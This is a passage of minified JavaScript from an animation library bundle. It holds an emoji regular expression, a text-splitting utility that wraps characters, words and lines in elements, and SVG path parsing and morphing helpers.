0\u2642]|(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2640\u2642])\uFE0F|(?:\uD83D\uDC41\uFE0F\u200D\uD83D\uDDE8|\uD83D\uDC69(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2695\u2696\u2708]|\uD83D\uDC69\u200D[\u2695\u2696\u2708]|\uD83D\uDC68(?:(?:\uD83C[\uDFFB-\uDFFF])\u200D[\u2695\u2696\u2708]|\u200D[\u2695\u2696\u2708]))\uFE0F|\uD83C\uDDF2(?:\uD83C[\uDDE6\uDDE8-\uDDED\uDDF0-\uDDFF])|\uD83D\uDC69\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D(?:\uD83D[\uDC68\uDC69])|\uD83D[\uDC68\uDC69]))|\uD83C\uDDF1(?:\uD83C[\uDDE6-\uDDE8\uDDEE\uDDF0\uDDF7-\uDDFB\uDDFE])|\uD83C\uDDEF(?:\uD83C[\uDDEA\uDDF2\uDDF4\uDDF5])|\uD83C\uDDED(?:\uD83C[\uDDF0\uDDF2\uDDF3\uDDF7\uDDF9\uDDFA])|\uD83C\uDDEB(?:\uD83C[\uDDEE-\uDDF0\uDDF2\uDDF4\uDDF7])|[#\*0-9]\uFE0F\u20E3|\uD83C\uDDE7(?:\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEF\uDDF1-\uDDF4\uDDF6-\uDDF9\uDDFB\uDDFC\uDDFE\uDDFF])|\uD83C\uDDE6(?:\uD83C[\uDDE8-\uDDEC\uDDEE\uDDF1\uDDF2\uDDF4\uDDF6-\uDDFA\uDDFC\uDDFD\uDDFF])|\uD83C\uDDFF(?:\uD83C[\uDDE6\uDDF2\uDDFC])|\uD83C\uDDF5(?:\uD83C[\uDDE6\uDDEA-\uDDED\uDDF0-\uDDF3\uDDF7-\uDDF9\uDDFC\uDDFE])|\uD83C\uDDFB(?:\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDEE\uDDF3\uDDFA])|\uD83C\uDDF3(?:\uD83C[\uDDE6\uDDE8\uDDEA-\uDDEC\uDDEE\uDDF1\uDDF4\uDDF5\uDDF7\uDDFA\uDDFF])|\uD83C\uDFF4\uDB40\uDC67\uDB40\uDC62(?:\uDB40\uDC77\uDB40\uDC6C\uDB40\uDC73|\uDB40\uDC73\uDB40\uDC63\uDB40\uDC74|\uDB40\uDC65\uDB40\uDC6E\uDB40\uDC67)\uDB40\uDC7F|\uD83D\uDC68(?:\u200D(?:\u2764\uFE0F\u200D(?:\uD83D\uDC8B\u200D)?\uD83D\uDC68|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC66\u200D\uD83D\uDC66|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67])|\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92])|(?:\uD83C[\uDFFB-\uDFFF])\u200D(?:\uD83C[\uDF3E\uDF73\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]))|\uD83C\uDDF8(?:\uD83C[\uDDE6-\uDDEA\uDDEC-\uDDF4\uDDF7-\uDDF9\uDDFB\uDDFD-\uDDFF])|\uD83C\uDDF0(?:\uD83C[\uDDEA\uDDEC-\uDDEE\uDDF2\uDDF3\uDDF5\uDDF7\uDDFC\uDDFE\uDDFF])|\uD83C\uDDFE(?:\uD83C[\uDDEA\uDDF9])|\uD83C\uDDEE(?:\uD83C[\uDDE8-\uDDEA\uDDF1-\uDDF4\uDDF6-\uDDF9])|\uD83C\uDDF9(?:\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDED\uDDEF-\uDDF4\uDDF7\uDDF9\uDDFB\uDDFC\uDDFF])|\uD83C\uDDEC(?:\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEE\uDDF1-\uDDF3\uDDF5-\uDDFA\uDDFC\uDDFE])|\uD83C\uDDFA(?:\uD83C[\uDDE6\uDDEC\uDDF2\uDDF3\uDDF8\uDDFE\uDDFF])|\uD83C\uDDEA(?:\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDED\uDDF7-\uDDFA])|\uD83C\uDDFC(?:\uD83C[\uDDEB\uDDF8])|(?:\u26F9|\uD83C[\uDFCB\uDFCC]|\uD83D\uDD75)(?:\uD83C[\uDFFB-\uDFFF])|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD37-\uDD39\uDD3D\uDD3E\uDDD6-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])|(?:[\u261D\u270A-\u270D]|\uD83C[\uDF85\uDFC2\uDFC7]|\uD83D[\uDC42\uDC43\uDC46-\uDC50\uDC66\uDC67\uDC70\uDC72\uDC74-\uDC76\uDC78\uDC7C\uDC83\uDC85\uDCAA\uDD74\uDD7A\uDD90\uDD95\uDD96\uDE4C\uDE4F\uDEC0\uDECC]|\uD83E[\uDD18-\uDD1C\uDD1E\uDD1F\uDD30-\uDD36\uDDD1-\uDDD5])(?:\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC68(?:\u200D(?:(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC67|(?:(?:\uD83D[\uDC68\uDC69])\u200D)?\uD83D\uDC66)|\uD83C[\uDFFB-\uDFFF])|(?:[\u261D\u26F9\u270A-\u270D]|\uD83C[\uDF85\uDFC2-\uDFC4\uDFC7\uDFCA-\uDFCC]|\uD83D[\uDC42\uDC43\uDC46-\uDC50\uDC66-\uDC69\uDC6E\uDC70-\uDC78\uDC7C\uDC81-\uDC83\uDC85-\uDC87\uDCAA\uDD74\uDD75\uDD7A\uDD90\uDD95\uDD96\uDE45-\uDE47\uDE4B-\uDE4F\uDEA3\uDEB4-\uDEB6\uDEC0\uDECC]|\uD83E[\uDD18-\uDD1C\uDD1E\uDD1F\uDD26\uDD30-\uDD39\uDD3D\uDD3E\uDDD1-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])?|(?:[\u231A\u231B\u23E9-\u23EC\u23F0\u23F3\u25FD\u25FE\u2614\u2615\u2648-\u2653\u267F\u2693\u26A1\u26AA\u26AB\u26BD\u26BE\u26C4\u26C5\u26CE\u26D4\u26EA\u26F2\u26F3\u26F5\u26FA\u26FD\u2705\u270A\u270B\u2728\u274C\u274E\u2753-\u2755\u2757\u2795-\u2797\u27B0\u27BF\u2B1B\u2B1C\u2B50\u2B55]|\uD83C[\uDC04\uDCCF\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE1A\uDE2F\uDE32-\uDE36\uDE38-\uDE3A\uDE50\uDE51\uDF00-\uDF20\uDF2D-\uDF35\uDF37-\uDF7C\uDF7E-\uDF93\uDFA0-\uDFCA\uDFCF-\uDFD3\uDFE0-\uDFF0\uDFF4\uDFF8-\uDFFF]|\uD83D[\uDC00-\uDC3E\uDC40\uDC42-\uDCFC\uDCFF-\uDD3D\uDD4B-\uDD4E\uDD50-\uDD67\uDD7A\uDD95\uDD96\uDDA4\uDDFB-\uDE4F\uDE80-\uDEC5\uDECC\uDED0-\uDED2\uDEEB\uDEEC\uDEF4-\uDEF8]|\uD83E[\uDD10-\uDD3A\uDD3C-\uDD3E\uDD40-\uDD45\uDD47-\uDD4C\uDD50-\uDD6B\uDD80-\uDD97\uDDC0\uDDD0-\uDDE6])|(?:[#\*0-9\xA9\xAE\u203C\u2049\u2122\u2139\u2194-\u2199\u21A9\u21AA\u231A\u231B\u2328\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638-\u263A\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692-\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753-\u2755\u2757\u2763\u2764\u2795-\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05-\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]|\uD83C[\uDC04\uDCCF\uDD70\uDD71\uDD7E\uDD7F\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE02\uDE1A\uDE2F\uDE32-\uDE3A\uDE50\uDE51\uDF00-\uDF21\uDF24-\uDF93\uDF96\uDF97\uDF99-\uDF9B\uDF9E-\uDFF0\uDFF3-\uDFF5\uDFF7-\uDFFF]|\uD83D[\uDC00-\uDCFD\uDCFF-\uDD3D\uDD49-\uDD4E\uDD50-\uDD67\uDD6F\uDD70\uDD73-\uDD7A\uDD87\uDD8A-\uDD8D\uDD90\uDD95\uDD96\uDDA4\uDDA5\uDDA8\uDDB1\uDDB2\uDDBC\uDDC2-\uDDC4\uDDD1-\uDDD3\uDDDC-\uDDDE\uDDE1\uDDE3\uDDE8\uDDEF\uDDF3\uDDFA-\uDE4F\uDE80-\uDEC5\uDECB-\uDED2\uDEE0-\uDEE5\uDEE9\uDEEB\uDEEC\uDEF0\uDEF3-\uDEF8]|\uD83E[\uDD10-\uDD3A\uDD3C-\uDD3E\uDD40-\uDD45\uDD47-\uDD4C\uDD50-\uDD6B\uDD80-\uDD97\uDDC0\uDDD0-\uDDE6])\uFE0F)/;function Ta(t){var e=t.nodeType,i="";if(1===e||9===e||11===e){if("string"==typeof t.textContent)return t.textContent;for(t=t.firstChild;t;t=t.nextSibling)i+=Ta(t)}else if(3===e||4===e)return t.nodeValue;return i}var Da,wa,Sa,Aa=/(?:\r|\n|\t\t)/g,Ca=/(?:\s\s+)/g,Ia=function(t){return wa.getComputedStyle(t)},Ra=Array.isArray,Pa=[].slice,Oa=function(t,e){var i;return Ra(t)?t:"string"==(i=typeof t)&&!e&&t?Pa.call(Da.querySelectorAll(t),0):t&&"object"===i&&"length"in t?Pa.call(t,0):t?[t]:[]},Na=function(t){return"absolute"===t.position||!0===t.absolute},Ma=function(t,e){for(var i,r=e.length;--r>-1;)if(i=e[r],t.substr(0,i.length)===i)return i.length},Fa=function(t,e){void 0===t&&(t="");var i=~t.indexOf("++"),r=1;return i&&(t=t.split("++").join("")),function(){return"<"+e+" style='position:relative;display:inline-block;'"+(t?" class='"+t+(i?r++:"")+"'>":">")}},La=function t(e,i,r){var n=e.nodeType;if(1===n||9===n||11===n)for(e=e.firstChild;e;e=e.nextSibling)t(e,i,r);else 3!==n&&4!==n||(e.nodeValue=e.nodeValue.split(i).join(r))},Ba=function(t,e){for(var i=e.length;--i>-1;)t.push(e[i])},Ua=function(t,e,i){for(var r;t&&t!==e;){if(r=t._next||t.nextSibling)return r.textContent.charAt(0)===i;t=t.parentNode||t._parent}},ka=function t(e){var i,r,n=Oa(e.childNodes),s=n.length;for(i=0;i<s;i++)(r=n[i])._isSplit?t(r):i&&r.previousSibling&&3===r.previousSibling.nodeType?(r.previousSibling.nodeValue+=3===r.nodeType?r.nodeValue:r.firstChild.nodeValue,e.removeChild(r)):3!==r.nodeType&&(e.insertBefore(r.firstChild,r),e.removeChild(r))},Ga=function(t,e){return parseFloat(e[t])||0},Ha=function(t,e,i,r,n,s,o){var a,h,u,l,c,d,p,f,g,m,v,_,y=Ia(t),x=Ga("paddingLeft",y),E=-999,b=Ga("borderBottomWidth",y)+Ga("borderTopWidth",y),T=Ga("borderLeftWidth",y)+Ga("borderRightWidth",y),D=Ga("paddingTop",y)+Ga("paddingBottom",y),w=Ga("paddingLeft",y)+Ga("paddingRight",y),S=Ga("fontSize",y)*(e.lineThreshold||.2),A=y.textAlign,C=[],I=[],R=[],P=e.wordDelimiter||" ",O=e.tag?e.tag:e.span?"span":"div",N=e.type||e.split||"chars,words,lines",M=n&&~N.indexOf("lines")?[]:null,F=~N.indexOf("words"),L=~N.indexOf("chars"),B=Na(e),U=e.linesClass,k=~(U||"").indexOf("++"),G=[],H="flex"===y.display,z=t.style.display;for(k&&(U=U.split("++").join("")),H&&(t.style.display="block"),u=(h=t.getElementsByTagName("*")).length,c=[],a=0;a<u;a++)c[a]=h[a];if(M||B)for(a=0;a<u;a++)((d=(l=c[a]).parentNode===t)||B||L&&!F)&&(_=l.offsetTop,M&&d&&Math.abs(_-E)>S&&("BR"!==l.nodeName||0===a)&&(p=[],M.push(p),E=_),B&&(l._x=l.offsetLeft,l._y=_,l._w=l.offsetWidth,l._h=l.offsetHeight),M&&((l._isSplit&&d||!L&&d||F&&d||!F&&l.parentNode.parentNode===t&&!l.parentNode._isSplit)&&(p.push(l),l._x-=x,Ua(l,t,P)&&(l._wordEnd=!0)),"BR"===l.nodeName&&(l.nextSibling&&"BR"===l.nextSibling.nodeName||0===a)&&M.push([])));for(a=0;a<u;a++)if(d=(l=c[a]).parentNode===t,"BR"!==l.nodeName)if(B&&(g=l.style,F||d||(l._x+=l.parentNode._x,l._y+=l.parentNode._y),g.left=l._x+"px",g.top=l._y+"px",g.position="absolute",g.display="block",g.width=l._w+1+"px",g.height=l._h+"px"),!F&&L)if(l._isSplit)for(l._next=h=l.nextSibling,l.parentNode.appendChild(l);h&&3===h.nodeType&&" "===h.textContent;)l._next=h.nextSibling,l.parentNode.appendChild(h),h=h.nextSibling;else l.parentNode._isSplit?(l._parent=l.parentNode,!l.previousSibling&&l.firstChild&&(l.firstChild._isFirst=!0),l.nextSibling&&" "===l.nextSibling.textContent&&!l.nextSibling.nextSibling&&G.push(l.nextSibling),l._next=l.nextSibling&&l.nextSibling._isFirst?null:l.nextSibling,l.parentNode.removeChild(l),c.splice(a--,1),u--):d||(_=!l.nextSibling&&Ua(l.parentNode,t,P),l.parentNode._parent&&l.parentNode._parent.appendChild(l),_&&l.parentNode.appendChild(Da.createTextNode(" ")),"span"===O&&(l.style.display="inline"),C.push(l));else l.parentNode._isSplit&&!l._isSplit&&""!==l.innerHTML?I.push(l):L&&!l._isSplit&&("span"===O&&(l.style.display="inline"),C.push(l));else M||B?(l.parentNode&&l.parentNode.removeChild(l),c.splice(a--,1),u--):F||t.appendChild(l);for(a=G.length;--a>-1;)G[a].parentNode.removeChild(G[a]);if(M){for(B&&(m=Da.createElement(O),t.appendChild(m),v=m.offsetWidth+"px",_=m.offsetParent===t?0:t.offsetLeft,t.removeChild(m)),g=t.style.cssText,t.style.cssText="display:none;";t.firstChild;)t.removeChild(t.firstChild);for(f=" "===P&&(!B||!F&&!L),a=0;a<M.length;a++){for(p=M[a],(m=Da.createElement(O)).style.cssText="display:block;text-align:"+A+";position:"+(B?"absolute;":"relative;"),U&&(m.className=U+(k?a+1:"")),R.push(m),u=p.length,h=0;h<u;h++)"BR"!==p[h].nodeName&&(l=p[h],m.appendChild(l),f&&l._wordEnd&&m.appendChild(Da.createTextNode(" ")),B&&(0===h&&(m.style.top=l._y+"px",m.style.left=x+_+"px"),l.style.top="0px",_&&(l.style.left=l._x-_+"px")));0===u?m.innerHTML="&nbsp;":F||L||(ka(m),La(m,String.fromCharCode(160)," ")),B&&(m.style.width=v,m.style.height=l._h+"px"),t.appendChild(m)}t.style.cssText=g}B&&(o>t.clientHeight&&(t.style.height=o-D+"px",t.clientHeight<o&&(t.style.height=o+b+"px")),s>t.clientWidth&&(t.style.width=s-w+"px",t.clientWidth<s&&(t.style.width=s+T+"px"))),H&&(z?t.style.display=z:t.style.removeProperty("display")),Ba(i,C),F&&Ba(r,I),Ba(n,R)},za=function(t,e,i,r){var n,s,o,a,h,u,l,c,d=e.tag?e.tag:e.span?"span":"div",p=~(e.type||e.split||"chars,words,lines").indexOf("chars"),f=Na(e),g=e.wordDelimiter||" ",m=" "!==g?"":f?"&#173; ":" ",v="</"+d+">",_=1,y=e.specialChars?"function"==typeof e.specialChars?e.specialChars:Ma:null,x=Da.createElement("div"),E=t.parentNode;for(E.insertBefore(x,t),x.textContent=t.nodeValue,E.removeChild(t),l=-1!==(n=Ta(t=x)).indexOf("<"),!1!==e.reduceWhiteSpace&&(n=n.replace(Ca," ").replace(Aa,"")),l&&(n=n.split("<").join("{{LT}}")),h=n.length,s=(" "===n.charAt(0)?m:"")+i(),o=0;o<h;o++)if(u=n.charAt(o),y&&(c=y(n.substr(o),e.specialChars)))u=n.substr(o,c||1),s+=p&&" "!==u?r()+u+"</"+d+">":u,o+=c-1;else if(u===g&&n.charAt(o-1)!==g&&o){for(s+=_?v:"",_=0;n.charAt(o+1)===g;)s+=m,o++;o===h-1?s+=m:")"!==n.charAt(o+1)&&(s+=m+i(),_=1)}else"{"===u&&"{{LT}}"===n.substr(o,6)?(s+=p?r()+"{{LT}}</"+d+">":"{{LT}}",o+=5):u.charCodeAt(0)>=55296&&u.charCodeAt(0)<=56319||n.charCodeAt(o+1)>=65024&&n.charCodeAt(o+1)<=65039?(a=((n.substr(o,12).split(ba)||[])[1]||"").length||2,s+=p&&" "!==u?r()+n.substr(o,a)+"</"+d+">":n.substr(o,a),o+=a-1):s+=p&&" "!==u?r()+u+"</"+d+">":u;t.outerHTML=s+(_?v:""),l&&La(E,"{{LT}}","<")},Va=function t(e,i,r,n){var s,o,a=Oa(e.childNodes),h=a.length,u=Na(i);if(3!==e.nodeType||h>1){for(i.absolute=!1,s=0;s<h;s++)(o=a[s])._next=o._isFirst=o._parent=o._wordEnd=null,(3!==o.nodeType||/\S+/.test(o.nodeValue))&&(u&&3!==o.nodeType&&"inline"===Ia(o).display&&(o.style.display="inline-block",o.style.position="relative"),o._isSplit=!0,t(o,i,r,n));return i.absolute=u,void(e._isSplit=!0)}za(e,i,r,n)},Xa=function(){function t(t,e){Sa||(Da=document,wa=window,Sa=1),this.elements=Oa(t),this.chars=[],this.words=[],this.lines=[],this._originals=[],this.vars=e||{},this.split(e)}var e=t.prototype;return e.split=function(t){this.isSplit&&this.revert(),this.vars=t=t||this.vars,this._originals.length=this.chars.length=this.words.length=this.lines.length=0;for(var e,i,r,n=this.elements.length,s=t.tag?t.tag:t.span?"span":"div",o=Fa(t.wordsClass,s),a=Fa(t.charsClass,s);--n>-1;)r=this.elements[n],this._originals[n]=r.innerHTML,e=r.clientHeight,i=r.clientWidth,Va(r,t,o,a),Ha(r,t,this.chars,this.words,this.lines,i,e);return this.chars.reverse(),this.words.reverse(),this.lines.reverse(),this.isSplit=!0,this},e.revert=function(){var t=this._originals;if(!t)throw"revert() call wasn't scoped properly.";return this.elements.forEach((function(e,i){return e.innerHTML=t[i]})),this.chars=[],this.words=[],this.lines=[],this.isSplit=!1,this},t.create=function(e,i){return new t(e,i)},t}();Xa.version="3.10.4";var ja=/[achlmqstvz]|(-?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,$a=/(?:(-)?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,Wa=/[\+\-]?\d*\.?\d+e[\+\-]?\d+/gi,Ya=/(^[#\.][a-z]|[a-y][a-z])/i,qa=Math.PI/180,Za=(Math.PI,Math.sin),Ka=Math.cos,Qa=Math.abs,Ja=Math.sqrt,th=(Math.atan2,function(t){return"string"==typeof t}),eh=function(t){return"number"==typeof t},ih=1e5,rh=function(t){return Math.round(t*ih)/ih||0};function nh(t){var e,i=0;for(t.reverse();i<t.length;i+=2)e=t[i],t[i]=t[i+1],t[i+1]=e;t.reversed=!t.reversed}var sh={rect:"rx,ry,x,y,width,height",circle:"r,cx,cy",ellipse:"rx,ry,cx,cy",line:"x1,x2,y1,y2"};function oh(t,e){var i,r,n,s,o,a,h,u,l,c,d,p,f,g,m,v,_,y,x,E,b,T,D=t.tagName.toLowerCase(),w=.552284749831;return"path"!==D&&t.getBBox?(a=function(t,e){var i,r=document.createElementNS("http://www.w3.org/2000/svg","path"),n=[].slice.call(t.attributes),s=n.length;for(e=","+e+",";--s>-1;)i=n[s].nodeName.toLowerCase(),e.indexOf(","+i+",")<0&&r.setAttributeNS(null,i,n[s].nodeValue);return r}(t,"x,y,width,height,cx,cy,rx,ry,r,x1,x2,y1,y2,points"),T=function(t,e){for(var i=e?e.split(","):[],r={},n=i.length;--n>-1;)r[i[n]]=+t.getAttribute(i[n])||0;return r}(t,sh[D]),"rect"===D?(s=T.rx,o=T.ry||s,r=T.x,n=T.y,c=T.width-2*s,d=T.height-2*o,i=s||o?"M"+(v=(g=(f=r+s)+c)+s)+","+(y=n+o)+" V"+(x=y+d)+" C"+[v,E=x+o*w,m=g+s*w,b=x+o,g,b,g-(g-f)/3,b,f+(g-f)/3,b,f,b,p=r+s*(1-w),b,r,E,r,x,r,x-(x-y)/3,r,y+(x-y)/3,r,y,r,_=n+o*(1-w),p,n,f,n,f+(g-f)/3,n,g-(g-f)/3,n,g,n,m,n,v,_,v,y].join(",")+"z":"M"+(r+c)+","+n+" v"+d+" h"+-c+" v"+-d+" h"+c+"z"):"circle"===D||"ellipse"===D?("circle"===D?u=(s=o=T.r)*w:(s=T.rx,u=(o=T.ry)*w),i="M"+((r=T.cx)+s)+","+(n=T.cy)+" C"+[r+s,n+u,r+(h=s*w),n+o,r,n+o,r-h,n+o,r-s,n+u,r-s,n,r-s,n-u,r-h,n-o,r,n-o,r+h,n-o,r+s,n-u,r+s,n].join(",")+"z"):"line"===D?i="M"+T.x1+","+T.y1+" L"+T.x2+","+T.y2:"polyline"!==D&&"polygon"!==D||(i="M"+(r=(l=(t.getAttribute("points")+"").match($a)||[]).shift())+","+(n=l.shift())+" L"+l.join(","),"polygon"===D&&(i+=","+r+","+n+"z")),a.setAttribute("d",uh(a._gsRawPath=hh(i))),e&&t.parentNode&&(t.parentNode.insertBefore(a,t),t.parentNode.removeChild(t)),a):t}function ah(t,e,i,r,n,s,o,a,h){if(t!==a||e!==h){i=Qa(i),r=Qa(r);var u=n%360*qa,l=Ka(u),c=Za(u),d=Math.PI,p=2*d,f=(t-a)/2,g=(e-h)/2,m=l*f+c*g,v=-c*f+l*g,_=m*m,y=v*v,x=_/(i*i)+y/(r*r);x>1&&(i=Ja(x)*i,r=Ja(x)*r);var E=i*i,b=r*r,T=(E*b-E*y-b*_)/(E*y+b*_);T<0&&(T=0);var D=(s===o?-1:1)*Ja(T),w=D*(i*v/r),S=D*(-r*m/i),A=(t+a)/2+(l*w-c*S),C=(e+h)/2+(c*w+l*S),I=(m-w)/i,R=(v-S)/r,P=(-m-w)/i,O=(-v-S)/r,N=I*I+R*R,M=(R<0?-1:1)*Math.acos(I/Ja(N)),F=(I*O-R*P<0?-1:1)*Math.acos((I*P+R*O)/Ja(N*(P*P+O*O)));isNaN(F)&&(F=d),!o&&F>0?F-=p:o&&F<0&&(F+=p),M%=p,F%=p;var L,B=Math.ceil(Qa(F)/(p/4)),U=[],k=F/B,G=4/3*Za(k/2)/(1+Ka(k/2)),H=l*i,z=c*i,V=c*-r,X=l*r;for(L=0;L<B;L++)m=Ka(n=M+L*k),v=Za(n),I=Ka(n+=k),R=Za(n),U.push(m-G*v,v+G*m,I+G*R,R-G*I,I,R);for(L=0;L<U.length;L+=2)m=U[L],v=U[L+1],U[L]=m*H+v*V+A,U[L+1]=m*z+v*X+C;return U[L-2]=a,U[L-1]=h,U}}function hh(t){var e,i,r,n,s,o,a,h,u,l,c,d,p,f,g,m=(t+"").replace(Wa,(function(t){var e=+t;return e<1e-4&&e>-1e-4?0:e})).match(ja)||[],v=[],_=0,y=0,x=2/3,E=m.length,b=0,T="ERROR: malformed path: "+t,D=function(t,e,i,r){l=(i-t)/3,c=(r-e)/3,a.push(t+l,e+c,i-l,r-c,i,r)};if(!t||!isNaN(m[0])||isNaN(m[1]))return console.log(T),v;for(e=0;e<E;e++)if(p=s,isNaN(m[e])?o=(s=m[e].toUpperCase())!==m[e]:e--,r=+m[e+1],n=+m[e+2],o&&(r+=_,n+=y),e||(h=r,u=n),"M"===s)a&&(a.length<8?v.length-=1:b+=a.length),_=h=r,y=u=n,a=[r,n],v.push(a),e+=2,s="L";else if("C"===s)a||(a=[0,0]),o||(_=y=0),a.push(r,n,_+1*m[e+3],y+1*m[e+4],_+=1*m[e+5],y+=1*m[e+6]),e+=6;else if("S"===s)l=_,c=y,"C"!==p&&"S"!==p||(l+=_-a[a.length-4],c+=y-a[a.length-3]),o||(_=y=0),a.push(l,c,r,n,_+=1*m[e+3],y+=1*m[e+4]),e+=4;else if("Q"===s)l=_+(r-_)*x,c=y+(n-y)*x,o||(_=y=0),_+=1*m[e+3],y+=1*m[e+4],a.push(l,c,_+(r-_)*x,y+(n-y)*x,_,y),e+=4;else if("T"===s)l=_-a[a.length-4],c=y-a[a.length-3],a.push(_+l,y+c,r+(_+1.5*l-r)*x,n+(y+1.5*c-n)*x,_=r,y=n),e+=2;else if("H"===s)D(_,y,_=r,y),e+=1;else if("V"===s)D(_,y,_,y=r+(o?y-_:0)),e+=1;else if("L"===s||"Z"===s)"Z"===s&&(r=h,n=u,a.closed=!0),("L"===s||Qa(_-r)>.5||Qa(y-n)>.5)&&(D(_,y,r,n),"L"===s&&(e+=2)),_=r,y=n;else if("A"===s){if(f=m[e+4],g=m[e+5],l=m[e+6],c=m[e+7],i=7,f.length>1&&(f.length<3?(c=l,l=g,i--):(c=g,l=f.substr(2),i-=2),g=f.charAt(1),f=f.charAt(0)),d=ah(_,y,+m[e+1],+m[e+2],+m[e+3],+f,+g,(o?_:0)+1*l,(o?y:0)+1*c),e+=i,d)for(i=0;i<d.length;i++)a.push(d[i]);_=a[a.length-2],y=a[a.length-1]}else console.log(T);return(e=a.length)<6?(v.pop(),e=0):a[0]===a[e-2]&&a[1]===a[e-1]&&(a.closed=!0),v.totalPoints=b+e,v}function uh(t){eh(t[0])&&(t=[t]);var e,i,r,n,s="",o=t.length;for(i=0;i<o;i++){for(n=t[i],s+="M"+rh(n[0])+","+rh(n[1])+" C",e=n.length,r=2;r<e;r++)s+=rh(n[r++])+","+rh(n[r++])+" "+rh(n[r++])+","+rh(n[r++])+" "+rh(n[r++])+","+rh(n[r])+" ";n.closed&&(s+="z")}return s}var lh,ch,dh,ph,fh,gh=function(){return lh||"undefined"!=typeof window&&(lh=window.gsap)&&lh.registerPlugin&&lh},mh=function(t){return"function"==typeof t},vh=Math.atan2,_h=Math.cos,yh=Math.sin,xh=Math.sqrt,Eh=Math.PI,bh=2*Eh,Th=.3*Eh,Dh=.7*Eh,wh=1e20,Sh=/[-+=\.]*\d+[\.e\-\+]*\d*[e\-\+]*\d*/gi,Ah=/(^[#\.][a-z]|[a-y][a-z])/i,Ch=/[achlmqstvz]/i,Ih=function(t){return console&&console.warn(t)},Rh=function(t){var e,i=t.length,r=0,n=0;for(e=0;e<i;e++)r+=t[e++],n+=t[e];return[r/(i/2),n/(i/2)]},Ph=function(t){var e,i,r,n=t.length,s=t[0],o=s,a=t[1],h=a;for(r=6;r<n;r+=6)(e=t[r])>s?s=e:e<o&&(o=e),(i=t[r+1])>a?a=i:i<h&&(h=i);return t.centerX=(s+o)/2,t.centerY=(a+h)/2,t.size=(s-o)*(a-h)},Oh=function(t,e){void 0===e&&(e=3);for(var i,r,n,s,o,a,h,u,l,c,d,p,f,g,m,v,_=t.length,y=t[0][0],x=y,E=t[0][1],b=E,T=1/e;--_>-1;)for(i=(o=t[_]).length,s=6;s<i;s+=6)for(l=o[s],c=o[s+1],d=o[s+2]-l,g=o[s+3]-c,p=o[s+4]-l,m=o[s+5]-c,f=o[s+6]-l,v=o[s+7]-c,a=e;--a>-1;)(r=((h=T*a)*h*f+3*(u=1-h)*(h*p+u*d))*h+l)>y?y=r:r<x&&(x=r),(n=(h*h*v+3*u*(h*m+u*g))*h+c)>E?E=n:n<b&&(b=n);return t.centerX=(y+x)/2,t.centerY=(E+b)/2,t.left=x,t.width=y-x,t.top=b,t.height=E-b,t.size=(y-x)*(E-b)},Nh=function(t,e){return e.length-t.length},Mh=function(t,e){var i=t.size||Ph(t),r=e.size||Ph(e);return Math.abs(r-i)<(i+r)/20?e.centerX-t.centerX||e.centerY-t.centerY:r-i},Fh=function(t,e){var i,r,n=t.slice(0),s=t.length,o=s-2;for(e|=0,i=0;i<s;i++)r=(i+e)%o,t[i++]=n[r],t[i]=n[r+1]},Lh=function(t,e,i,r,n){var s,o,a,h,u=t.length,l=0,c=u-2;for(i*=6,o=0;o<u;o+=6)h=t[s=(o+i)%c]-(e[o]-r),a=t[s+1]-(e[o+1]-n),l+=xh(a*a+h*h);return l},Bh=function(t,e,i){var r,n,s,o=t.length,a=Rh(t),h=Rh(e),u=h[0]-a[0],l=h[1]-a[1],c=Lh(t,e,0,u,l),d=0;for(s=6;s<o;s+=6)(n=Lh(t,e,s/6,u,l))<c&&(c=n,d=s);if(i)for(nh(r=t.slice(0)),s=6;s<o;s+=6)(n=Lh(r,e,s/6,u,l))<c&&(c=n,d=-s);return d/6},Uh=function(t,e,i){for(var 